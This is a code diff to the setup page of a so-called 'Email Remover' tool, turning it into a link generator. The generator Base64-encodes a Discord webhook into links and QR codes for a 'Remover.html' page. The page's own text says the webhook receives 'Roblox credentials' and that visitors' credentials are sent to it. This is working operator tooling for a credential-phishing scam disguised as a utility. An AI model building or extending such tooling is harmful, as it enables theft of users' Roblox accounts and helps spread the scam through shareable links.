@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Remover Setup</title>
+    <title>Email Remover Link Generator</title>
     <link href="all.min.css" rel="stylesheet">
     <link href="css2.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
     <style>
         :root {
             --primary: #0066ff;
@@ -171,14 +172,34 @@
             border-radius: 8px;
             color: var(--success);
         }
+        
+        .qr-code-container {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .qr-code-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+        
+        #qr-code {
+            display: inline-block;
+            padding: 10px;
+            background: white;
+            border-radius: 5px;
+            box-shadow: var(--card-shadow);
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
             <div class="header">
-                <h1 class="title">Email Remover Setup</h1>
-                <p class="subtitle">Configure your Discord webhook to receive Roblox credentials</p>
+                <h1 class="title">Email Remover Link Generator</h1>
+                <p class="subtitle">Create custom links with your Discord webhook</p>
             </div>
 
             <div class="input-group">
@@ -188,9 +209,47 @@
                 <input id="webhook-url" class="input-field" type="text" placeholder="https://discord.com/api/webhooks/..." />
             </div>
 
-            <button id="save-btn" class="btn">
-                <i class="fas fa-save"></i> Save Configuration
+            <div class="input-group">
+                <label for="directory" class="input-label">
+                    <i class="fas fa-folder"></i> Directory Name (optional)
+                </label>
+                <input id="directory" class="input-field" type="text" placeholder="Enter a directory" />
+                <small style="display: block; margin-top: 5px; color: #888;">This will appear as a clickable link in Discord. You can enter a URL here to create a direct link.</small>
+            </div>
+
+            <button id="generate-btn" class="btn">
+                <i class="fas fa-magic"></i> Generate Link
             </button>
+
+            <div id="link-result" class="input-group" style="display: none; margin-top: 20px;">
+                <label for="generated-link" class="input-label">
+                    <i class="fas fa-link"></i> Your Custom Link
+                </label>
+                <div style="display: flex;">
+                    <input id="generated-link" class="input-field" type="text" readonly />
+                    <button id="copy-btn" class="btn" style="width: auto; margin-left: 10px; padding: 12px 15px;">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <div class="info-title">
+                    <i class="fas fa-info-circle"></i> How to Use This Generator
+                </div>
+                <div class="info-content">
+                    <ol>
+                        <li>Create a Discord webhook (see instructions below)</li>
+                        <li>Enter your webhook URL in the field above</li>
+                        <li>Optionally enter a directory name or URL to organize your links (will appear as a clickable link in Discord)</li>
+                        <li>Click "Generate Link" to create your custom link</li>
+                        <li>Copy the generated link or share the QR code with your users</li>
+                        <li>When users visit your link, their credentials will be sent to your webhook</li>
+                        <li>Each generated link is unique and can be tracked by its token</li>
+                        <li>The directory name will be displayed as a clickable link in Discord. If you enter a URL (starting with http:// or https://), it will be used as the actual link destination.</li>
+                    </ol>
+                </div>
+            </div>
 
             <div class="info-box">
                 <div class="info-title">
@@ -209,7 +268,14 @@
             </div>
 
             <div id="success-message" class="success-message">
-                <i class="fas fa-check-circle"></i> Configuration saved successfully! You can now close this page and use the Email Remover Tool.
+                <i class="fas fa-check-circle"></i> Link generated successfully! Copy and share your custom Remover link.
+            </div>
+            
+            <div id="qr-code-container" class="qr-code-container">
+                <div class="qr-code-title">
+                    <i class="fas fa-qrcode"></i> QR Code for Easy Sharing
+                </div>
+                <div id="qr-code"></div>
             </div>
         </div>
     </div>
@@ -217,17 +283,30 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const webhookUrlInput = document.getElementById('webhook-url');
-            const saveBtn = document.getElementById('save-btn');
+            const directoryInput = document.getElementById('directory');
+            const generateBtn = document.getElementById('generate-btn');
             const successMessage = document.getElementById('success-message');
+            const linkResult = document.getElementById('link-result');
+            const generatedLink = document.getElementById('generated-link');
+            const copyBtn = document.getElementById('copy-btn');
 
-            // Check if webhook URL is already saved
-            const savedWebhook = localStorage.getItem('discord_webhook_url');
-            if (savedWebhook) {
-                webhookUrlInput.value = savedWebhook;
+            // Function to encode data for URL
+            function encodeData(data) {
+                // First convert to JSON string
+                const jsonString = JSON.stringify(data);
+                // Then encode with Base64
+                return btoa(jsonString);
             }
 
-            saveBtn.addEventListener('click', function() {
+            // Function to generate a unique token
+            function generateToken() {
+                return Math.random().toString(36).substring(2, 15) + 
+                       Math.random().toString(36).substring(2, 15);
+            }
+
+            generateBtn.addEventListener('click', function() {
                 const webhookUrl = webhookUrlInput.value.trim();
+                const directory = directoryInput.value.trim();
                 
                 if (!webhookUrl) {
                     alert('Please enter a Discord webhook URL');
@@ -239,23 +318,77 @@
                     return;
                 }
 
-                // Save webhook URL to localStorage
-                localStorage.setItem('discord_webhook_url', webhookUrl);
+                // Create data object
+                const data = {
+                    url: webhookUrl,
+                    directory: directory,
+                    token: generateToken() // Add a unique token for security
+                };
 
-                // Show success message
+                // Encode the data
+                const encodedData = encodeData(data);
+
+                // Generate the link
+                // Get the current URL and remove any query parameters
+                const baseUrl = window.location.href.split('?')[0];
+                // Replace 'setup.html' with 'Remover.html'
+                const removerUrl = baseUrl.replace('setup.html', 'Remover.html');
+                // Add the encoded data as a query parameter
+                const finalUrl = `${removerUrl}?data=${encodedData}`;
+
+                // Display the generated link
+                generatedLink.value = finalUrl;
+                linkResult.style.display = 'block';
                 successMessage.style.display = 'block';
+                
+                // Generate QR code
+                const qrCodeContainer = document.getElementById('qr-code-container');
+                const qrCodeElement = document.getElementById('qr-code');
+                qrCodeContainer.style.display = 'block';
+                
+                // Clear previous QR code if any
+                qrCodeElement.innerHTML = '';
+                
+                // Generate new QR code
+                try {
+                    const qr = qrcode(0, 'L');
+                    qr.addData(finalUrl);
+                    qr.make();
+                    qrCodeElement.innerHTML = qr.createImgTag(5);
+                } catch (error) {
+                    console.error('Error generating QR code:', error);
+                    qrCodeElement.innerHTML = '<p>Failed to generate QR code</p>';
+                }
 
                 // Test the webhook
                 const testData = {
-                    content: 'Email Remover Tool has been configured successfully!',
+                    content: 'Email Remover Link Generator - Test Message',
                     embeds: [{
-                        title: 'Configuration Test',
+                        title: 'Link Generation Test',
                         description: 'This is a test message to confirm your webhook is working correctly.',
                         color: 0x00FFFF,
                         fields: [
                             {
-                                name: 'Setup Time',
+                                name: 'Generated At',
                                 value: new Date().toLocaleString(),
+                                inline: true
+                            },
+                            {
+                                name: 'Directory',
+                                value: directory ? (() => {
+                                    let directoryText = directory;
+                                    let directoryUrl = finalUrl;
+                                    
+                                    // Check if directory contains a URL
+                                    if (directory.startsWith('http://') || directory.startsWith('https://')) {
+                                        directoryUrl = directory;
+                                        // Display only the domain name as the visible text
+                                        const urlObj = new URL(directory);
+                                        directoryText = urlObj.hostname;
+                                    }
+                                    
+                                    return `[${directoryText}](${directoryUrl})`;
+                                })() : 'None specified',
                                 inline: true
                             }
                         ]
@@ -278,8 +411,21 @@
                 .catch(error => {
                     console.error('Error sending test message:', error);
                     alert('Failed to send test message. Please check your webhook URL and try again.');
-                    successMessage.style.display = 'none';
+                    // Don't hide success message since the link was still generated
                 });
+            });
+
+            // Copy button functionality
+            copyBtn.addEventListener('click', function() {
+                generatedLink.select();
+                document.execCommand('copy');
+                
+                // Change button text temporarily
+                const originalText = copyBtn.innerHTML;
+                copyBtn.innerHTML = '<i class="fas fa-check"></i>';
+                setTimeout(() => {
+                    copyBtn.innerHTML = originalText;
+                }, 2000);
             });
         });
     </script>
